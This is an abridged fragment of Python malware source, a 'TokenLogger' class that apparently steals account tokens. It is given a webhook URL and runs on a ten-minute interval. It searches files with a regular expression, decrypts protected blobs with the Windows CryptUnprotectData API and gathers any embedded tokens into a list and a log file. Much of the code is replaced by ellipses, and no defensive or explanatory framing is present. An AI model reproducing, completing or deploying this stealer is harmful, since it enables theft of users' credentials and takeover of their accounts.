...
class TokenLogger:
    def __init__(self, software_dir_name, webhook_url):
        ...
        self.log_file = os.path.join(get_logs_path(self.software_dir_name), "token_log.txt")
        self.interval = 600
                                ...
                                for match in re.findall(regexp_enc, line):
                                    ...
                                    try:
                                        ...
                                        if enc[0] == 0x41:
                                            ...
                                            raw_data = CryptUnprotectData(enc, None, None, None, 0)[1].decode()
                                            uid = uid.replace('"', '')
                                            if raw_data and 'token' in raw_data:
                                                tokens.append(json.loads(raw_data)['token'])
